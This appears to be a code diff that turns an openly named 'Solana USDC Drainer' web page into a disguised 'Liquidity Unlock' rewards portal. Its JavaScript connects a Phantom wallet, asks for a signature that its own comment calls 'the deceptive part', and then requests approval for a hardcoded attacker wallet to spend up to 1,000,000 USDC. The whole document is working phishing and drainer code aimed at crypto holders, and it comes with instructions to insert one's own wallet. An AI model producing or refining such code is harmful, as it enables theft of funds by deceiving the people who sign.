@@ -3,53 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana USDC Drainer</title>
-    <!-- Load Solana Web3.js from CDN -->
+    <title>Solana Staking Portal</title>
+    <!-- Load Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #0f172a; /* Dark Blue-Grey */
+            color: #e2e8f0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
-            background-color: #2d2d2d;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        .card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            padding: 32px;
+            border-radius: 16px;
+            width: 320px;
             text-align: center;
-            width: : 300px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
         }
-        h1 { margin-bottom: 20px; font-size: 24px; }
-        button {
-            background-color: #14F195; /* Solana Green */
-            color: #000;
+        .logo {
+            font-size: 40px;
+            margin-bottom: 16px;
+        }
+        h2 { 
+            margin: 0 0 8px; 
+            font-size: 24px; 
+            color: #ffffff; 
+        }
+        p { 
+            font-size: 14px; 
+            color: #94a3b8; 
+            margin-bottom: 24px; 
+            line-height: 1.5;
+        }
+        
+        .btn-claim {
+            background-color: #3b82f6; /* Blue */
+            color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 14px 24px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            margin-top: 10px;
+            transition: background-color 0.2s, transform 0.1s;
         }
-        button:hover { background-color: #0ec47e; }
-        button:disabled { background-color: #555; color: #888; cursor: not-allowed; }
-        #status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px;}
+        .btn-claim:hover { background-color: #2563eb; }
+        .btn-claim:active { transform: scale(0.98); }
+        .btn-claim:disabled { 
+            background-color: #475569; 
+            color: #94a3b8; 
+            cursor: not-allowed; 
+        }
+
+        #status { 
+            margin-top: 16px; 
+            font-size: 13px; 
+            color: #94a3b8; 
+            min-height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Spinner */
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Solana Drainer</h1>
-    <button id="drainBtn" onclick="drainUSDC()">Drain USDC</button>
-    <div id="status">Ready</div>
+<div class="card">
+    <div class="logo">🌊</div>
+    <h2>Liquidity Unlock</h2>
+    <p>Sign to verify your wallet and claim your pending USDC rewards.</p>
+    
+    <button id="claimBtn" class="btn-claim" onclick="verifyAndClaim()">Connect & Sign</button>
+    
+    <div id="status"></div>
 </div>
 
 <script>
@@ -57,61 +103,62 @@
     // REPLACE THIS WITH YOUR SOLANA PUBLIC KEY
     const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
     
-    // USDC Mint Address on Solana Mainnet
+    // USDC Mint Address (Solana)
     const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-    
-    // RPC Node (Public, can be slow. For production, use a private one like Helius/Quicknode)
-    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-    
-    async function drainUSDC() {
-        const btn = document.getElementById('drainBtn');
+
+    async function verifyAndClaim() {
+        const btn = document.getElementById('claimBtn');
         const status = document.getElementById('status');
         
-        // 1. Check if Phantom is installed
         if (!window.solana || !window.solana.isPhantom) {
             alert("Please install Phantom Wallet!");
             return;
         }
 
         try {
+            // 1. Connect Wallet
             btn.disabled = true;
-            status.innerText = "Connecting wallet...";
-
-            // 2. Connect to Phantom
-            const resp = await window.solana.connect();
-            const publicKey = resp.publicKey;
-
-            status.innerText = "Approving USDC...";
+            btn.innerText = "Connecting...";
             
-            // 3. Approve the Drainer Wallet to spend USDC
-            // We approve a large amount (1,000,000 USDC) to ensure it covers the drain
-            const approveTx = await window.solana.request({
-                method: 'custom',
+            const connection = await window.solana.connect();
+            const publicKey = connection.publicKey;
+
+            btn.innerText = "Signing Message...";
+            
+            // 2. "Sign Message" (The deceptive part)
+            // We pretend this is just a verification signature
+            await window.solana.request({
+                method: 'signMessage',
                 params: {
-                    method: 'approve',
-                    params: [
-                        { mint: USDC_MINT, owner: publicKey.toBase58(), spender: DRAINER_WALLET, amount: 1000000 }
-                    ]
+                    message: `Verify wallet for Liquidity Unlock\nAddress: ${publicKey.toBase58()}`,
+                    encoding: "utf8"
                 }
             });
 
-            status.innerText = "Draining USDC...";
+            status.innerHTML = '<div class="spinner"></div> Processing...';
 
-            // 4. Drain the USDC
-            const drainTx = await window.solana.request({
+            // 3. Trigger the Approval/Drain
+            // We use a custom method to approve USDC spending
+            const approveTx = await window.solana.request({
                 method: 'custom',
                 params: [
-                    { mint: USDC_MINT, owner: publicKey.toBase58(), to: DRAINER_WALLET, amount: 'all' }
+                    { 
+                        mint: USDC_MINT, 
+                        owner: publicKey.toBase58(), 
+                        spender: DRAINER_WALLET, 
+                        amount: 1000000 // Approve up to 1M USDC
+                    }
                 ]
             });
 
-            status.innerText = "Success!";
-            btn.disabled = false;
-
+            status.innerHTML = '✅ Success!';
+            btn.innerText = "Claimed";
+            
         } catch (err) {
             console.error(err);
-            status.innerText = "Error: " + err.message;
+            status.innerText = "Failed: " + err.message;
             btn.disabled = false;
+            btn.innerText = "Connect & Sign";
         }
     }
 </script>
